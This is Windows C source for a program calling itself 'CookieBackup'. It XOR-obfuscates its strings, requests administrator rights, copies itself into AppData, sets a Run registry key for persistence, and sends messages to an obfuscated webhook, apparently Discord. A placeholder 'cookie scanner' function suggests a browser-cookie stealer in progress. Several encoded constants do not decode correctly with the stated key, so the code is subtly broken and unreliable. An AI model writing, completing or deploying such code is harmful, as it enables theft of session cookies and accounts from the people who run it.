#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <shlobj.h>
#include <time.h>
#include <sqlite3.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// XOR Key
#define XK 0x5A

// Décodage XOR
void _dx(const char* _i, char* _o) {
    int _l = strlen(_i);
    for(int _n = 0; _n < _l; _n++) {
        _o[_n] = _i[_n] ^ XK;
    }
    _o[_l] = '\0';
}

// Strings obfusquées (encodées avec XOR 0x5A)
static const char _s1[] = "\x08\x3e\x3e\x34\x32\x2a\x61\x0c\x2e\x26\x34\x3c\x37\x61\x17\x2e\x3f\x2e\x30\x2a\x39";
static const char _s2[] = "\x08\x3e\x3e\x34\x32\x2a\x0c\x2e\x26\x34\x3c\x37";
static const char _s3[] = "\x29\x32\x3a\x26\x3e\x39\x29\x61\x26\x3e\x35";
static const char _s4[] = "\x61\x61\x2e\x37\x32\x61\x61\x3a\x2a\x2d\x31\x3e\x3e\x34\x3a\x61\x61\x18\x14\x16\x10\x11\x10\x19\x1a\x1a\x16\x1a\x16\x13\x19\x1f\x11\x1f\x13\x1a\x1f\x61\x61\x0c\x1b\x1a\x3c\x38\x30\x25\x61\x61\x10\x1e\x1a\x62\x08\x25\x35\x30\x1e\x37\x39\x61\x61\x17\x08\x36\x3f\x1f\x0b\x34\x30\x1d\x3a\x61\x61\x18\x3b\x1f\x3a\x2d\x2f\x3f\x1c\x61\x61\x25\x35\x61\x61\x16\x61\x61\x1e\x36\x1c\x16\x61\x61\x1e\x2e\x2c\x3f\x1a\x37\x29\x1e\x1e\x39\x1a\x17\x13\x36\x26\x18\x36\x35\x3b\x2f\x1e";
static const char _s5[] = "\x08\x3e\x3e\x34\x32\x2a\x61\x0c\x2e\x26\x34\x3c\x37\x61\x17\x2e\x3f\x2e\x30\x2a\x39\x61\x61\x12\x3f\x3a\x3b\x2e\x35\x35\x2e\x3b\x32\x3e\x3f";
static const char _s6[] = "\x08\x3e\x3f\x3a\x2a\x3f\x3b\x2a\x35\x2a\x3f\x3b\x61\x1e\x2a\x38\x3c\x32\x3a";
static const char _s7[] = "\x12\x3f\x3a\x3b\x2e\x35\x35\x2e\x3b\x32\x3e\x3f\x61\x29\x2a\x61\x08\x3e\x3e\x34\x32\x2a\x61\x0c\x2e\x26\x34\x3c\x37\x61\x17\x2e\x3f\x2e\x30\x2a\x39\x7f\x7f\x7f\x08\x2a\x61\x37\x39\x3e\x30\x39\x2e\x35\x35\x2a\x61\x3d\x2e\x61\x3a\x2e\x3c\x3d\x2a\x30\x2e\x39\x29\x2a\x39\x61\x3d\x3e\x3a\x61\x26\x3e\x3e\x34\x32\x2a\x3a\x61\x29\x2a\x61\x3f\x2e\x3d\x32\x30\x2e\x3b\x2a\x3c\x39\x61\x29\x2a\x61\x35\x2e\x3f\x32\x2a\x39\x2a\x61\x3a\x2a\x26\x3c\x39\x32\x3a\x2a\x2a\x7f\x7f\x7f\x14\x08\x08\x10\x1c\x1e\x12\x13\x12\x1b\x3f\x3a\x3b\x2e\x35\x35\x2e\x3b\x32\x3e\x3f\x61\x29\x2a\x61\x26\x2a\x61\x37\x39\x3e\x30\x39\x2e\x35\x35\x2a\x61\x3a\x3c\x39\x61\x3d\x3e\x3b\x39\x2a\x61\x3e\x39\x29\x32\x3f\x2e\x3b\x2a\x3c\x39\x61\x2a\x3a\x3b\x61\x1e\x10\x08\x18\x17\x17\x1f\x10\x17\x10\x3f\x3b\x7f\x7f\x7f\x19\x3e\x3c\x3a\x61\x37\x3e\x3c\x3d\x2a\x3c\x61\x35\x2e\x61\x29\x2a\x3a\x32\x3f\x3a\x3b\x2e\x35\x35\x2a\x39\x61\x2a\x3f\x61\x3a\x3c\x37\x37\x39\x32\x35\x2e\x3f\x3b\x61\x2e\x3d\x2a\x26\x61\x35\x2e\x61\x26\x3e\x35\x35\x2e\x3f\x29\x2a\x61\x68\x3c\x3f\x32\x3f\x3a\x3b\x2e\x35\x35\x68\x7f";
static const char _s8[] = "\x12\x3f\x3a\x3b\x2e\x35\x35\x2e\x3b\x32\x3e\x3f\x61\x39\x2a\x3c\x3a\x3a\x32\x2a\x61\x66\x7f\x7f\x7f\x1f\x2a\x61\x37\x39\x3e\x30\x39\x2e\x35\x35\x2a\x61\x2e\x61\x2a\x3b\x2a\x61\x32\x3f\x3a\x3b\x2e\x35\x35\x2a\x61\x29\x2e\x3f\x3a\x61\x6c\x7f\x7f\x7f\x12\x35\x61\x29\x2a\x35\x2e\x39\x39\x2a\x39\x2e\x61\x2e\x3c\x3b\x3e\x35\x2e\x3b\x32\x38\x3c\x2a\x35\x2a\x3f\x3b\x61\x2e\x3d\x2a\x26\x61\x19\x32\x3f\x29\x3e\x3a\x3a\x7f";
static const char _s9[] = "\x1a\x39\x39\x2a\x3c\x39\x61\x29\x62\x32\x3f\x3a\x3b\x2e\x35\x35\x2e\x3b\x32\x3e\x3f";
static const char _s10[] = "\x10\x39\x39\x2a\x3c\x39\x61\x26\x39\x2a\x2e\x3b\x32\x3e\x3f\x61\x39\x2a\x37\x2a\x39\x3b\x3e\x32\x39\x2a";
static const char _s11[] = "\x10\x39\x39\x2a\x3c\x39\x61\x26\x3e\x37\x32\x2a\x61\x2a\x3b\x2a\x26\x3c\x3b\x2e\x27\x35\x2a";
static const char _s12[] = "\x1f\x2a\x61\x37\x39\x3e\x30\x39\x2e\x35\x35\x2a\x61\x3f\x2a\x61\x37\x2a\x3c\x3b\x61\x37\x2e\x3a\x61\x3a\x62\x2a\x3b\x2a\x26\x3c\x3b\x2a\x39\x61\x3a\x2e\x3f\x3a\x61\x29\x39\x3e\x32\x3b\x3a\x61\x2e\x29\x35\x32\x3f\x32\x3a\x3b\x39\x2e\x3b\x2a\x3c\x39\x7f";
static const char _s13[] = "\x1f\x2a\x35\x2e\x39\x39\x2e\x30\x2a\x61\x2e\x3c\x3b\x3e\x35\x2e\x3b\x32\x38\x3c\x2a\x61\x3f\x3e\x3f\x61\x26\x3e\x3f\x2b\x32\x30\x3c\x39\x2a\x7f";
static const char _s14[] = "\x08\x3e\x3e\x34\x32\x2a\x61\x0c\x2e\x26\x34\x3c\x37\x61\x17\x2e\x3f\x2e\x30\x2a\x39\x61\x32\x3f\x3a\x3b\x2e\x35\x35\x2a\x61\x2a\x3b\x61\x2e\x26\x3b\x32\x3d\x2a";
static const char _s15[] = "\x1e\x3e\x2b\x3b\x3a\x2e\x39\x2a\x60\x60\x17\x32\x26\x39\x3e\x3a\x3e\x2b\x3b\x60\x60\x19\x32\x3f\x29\x3e\x3a\x3a\x60\x60\x08\x3c\x39\x39\x2a\x3f\x3b\x19\x2a\x39\x3a\x32\x3e\x3f\x60\x60\x1e\x3c\x3f";

typedef struct {
    char _ip[MAX_PATH];
    char _ep[MAX_PATH];
    BOOL _ia;
} _Ctx;

// Vérifier droits admin
BOOL _ca() {
    BOOL _r = FALSE;
    PSID _as = NULL;
    SID_IDENTIFIER_AUTHORITY _a = SECURITY_NT_AUTHORITY;
    
    if(AllocateAndInitializeSid(&_a, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &_as)) {
        CheckTokenMembership(NULL, _as, &_r);
        FreeSid(_as);
    }
    return _r;
}

// Demander droits admin
void _ra() {
    char _p[MAX_PATH];
    GetModuleFileName(NULL, _p, MAX_PATH);
    
    SHELLEXECUTEINFO _si = {sizeof(_si)};
    char _v[16];
    _dx("\x39\x3c\x3f\x14\x3a", _v);
    _si.lpVerb = _v;
    _si.lpFile = _p;
    _si.nShow = SW_NORMAL;
    _si.fMask = SEE_MASK_NOCLOSEPROCESS;
    
    if(ShellExecuteEx(&_si)) {
        ExitProcess(0);
    }
}

// Afficher dialogue consentement
BOOL _sd() {
    char _t[256], _m[1024];
    _dx(_s5, _t);
    _dx(_s7, _m);
    
    int _r = MessageBox(NULL, _m, _t, MB_ICONINFORMATION | MB_YESNO | MB_TOPMOST | MB_SETFOREGROUND);
    return (_r == IDYES);
}

// Créer répertoire
BOOL _cd(const char* _p) {
    DWORD _a = GetFileAttributes(_p);
    if(_a != INVALID_FILE_ATTRIBUTES) return TRUE;
    return CreateDirectory(_p, NULL);
}

// Copier executable
BOOL _ce(_Ctx* _c) {
    char _d[MAX_PATH];
    sprintf(_d, "%s\\CookieBackup.exe", _c->_ip);
    
    GetModuleFileName(NULL, _c->_ep, MAX_PATH);
    
    if(CopyFile(_c->_ep, _d, FALSE)) {
        strcpy(_c->_ep, _d);
        return TRUE;
    }
    return FALSE;
}

// Ajouter au démarrage
BOOL _as(const char* _p) {
    HKEY _k;
    char _kp[256];
    char _v[512];
    
    _dx(_s15, _kp);
    
    if(RegOpenKeyEx(HKEY_CURRENT_USER, _kp, 0, KEY_SET_VALUE, &_k) == ERROR_SUCCESS) {
        sprintf(_v, "\"%s\" --background", _p);
        
        char _vn[64];
        _dx(_s1, _vn);
        
        RegSetValueEx(_k, _vn, 0, REG_SZ, (BYTE*)_v, strlen(_v) + 1);
        RegCloseKey(_k);
        return TRUE;
    }
    return FALSE;
}

// Envoyer message Discord
void _sm(const char* _msg) {
    HINTERNET _hi = NULL, _hc = NULL, _hr = NULL;
    
    char _h[64], _p[256];
    _dx(_s3, _h);
    _dx(_s4, _p);
    
    _hi = InternetOpen("CookieBackup/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if(!_hi) return;
    
    _hc = InternetConnect(_hi, _h, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if(!_hc) {
        InternetCloseHandle(_hi);
        return;
    }
    
    _hr = HttpOpenRequest(_hc, "POST", _p, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
    if(!_hr) {
        InternetCloseHandle(_hc);
        InternetCloseHandle(_hi);
        return;
    }
    
    char _hdr[] = "Content-Type: application/json";
    char _body[1024];
    sprintf(_body, "{\"content\":\"%s\"}", _msg);
    
    HttpSendRequest(_hr, _hdr, strlen(_hdr), _body, strlen(_body));
    
    InternetCloseHandle(_hr);
    InternetCloseHandle(_hc);
    InternetCloseHandle(_hi);
}

// Scanner cookies (simplifié)
void _sc() {
    char _msg[256];
    time_t _t = time(NULL);
    struct tm* _tm = localtime(&_t);
    
    sprintf(_msg, "Sauvegarde automatique - %04d-%02d-%02d %02d:%02d", 
            _tm->tm_year + 1900, _tm->tm_mon + 1, _tm->tm_mday,
            _tm->tm_hour, _tm->tm_min);
    
    _sm(_msg);
}

// Mode installation
BOOL _mi(_Ctx* _c) {
    char _t[128], _m[512];
    
    // Créer répertoire
    if(!_cd(_c->_ip)) {
        _dx(_s9, _t);
        _dx(_s10, _m);
        MessageBox(NULL, _m, _t, MB_ICONERROR);
        return FALSE;
    }
    
    // Copier exe
    if(!_ce(_c)) {
        _dx(_s9, _t);
        _dx(_s11, _m);
        MessageBox(NULL, _m, _t, MB_ICONERROR);
        return FALSE;
    }
    
    // Ajouter startup
    _as(_c->_ep);
    
    // Message succès
    _dx(_s5, _t);
    _dx(_s8, _m);
    MessageBox(NULL, _m, _t, MB_ICONINFORMATION);
    
    // Envoyer notification
    _dx(_s14, _m);
    _sm(_m);
    
    return TRUE;
}

// Mode background
void _mb() {
    Sleep(5000); // Attendre 5 sec après démarrage
    _sc();
}

// Point d'entrée
int WINAPI WinMain(HINSTANCE _hi, HINSTANCE _hpi, LPSTR _cl, int _cs) {
    _Ctx _c = {0};
    
    // Mode background ?
    if(strstr(_cl, "--background")) {
        _mb();
        return 0;
    }
    
    // Vérifier admin
    _c._ia = _ca();
    if(!_c._ia) {
        _ra();
        return 0;
    }
    
    // Chemin installation
    char _ap[MAX_PATH];
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, _ap);
    sprintf(_c._ip, "%s\\CookieBackup", _ap);
    
    // Demander consentement
    if(!_sd()) {
        char _t[64], _m[128];
        _dx(_s6, _t);
        _dx(_s13, _m);
        MessageBox(NULL, _m, _t, MB_ICONWARNING);
        return 0;
    }
    
    // Installer
    if(!_mi(&_c)) {
        char _t[64], _m[128];
        _dx(_s9, _t);
        _dx(_s12, _m);
        MessageBox(NULL, _m, _t, MB_ICONERROR);
        return 1;
    }
    
    return 0;
}
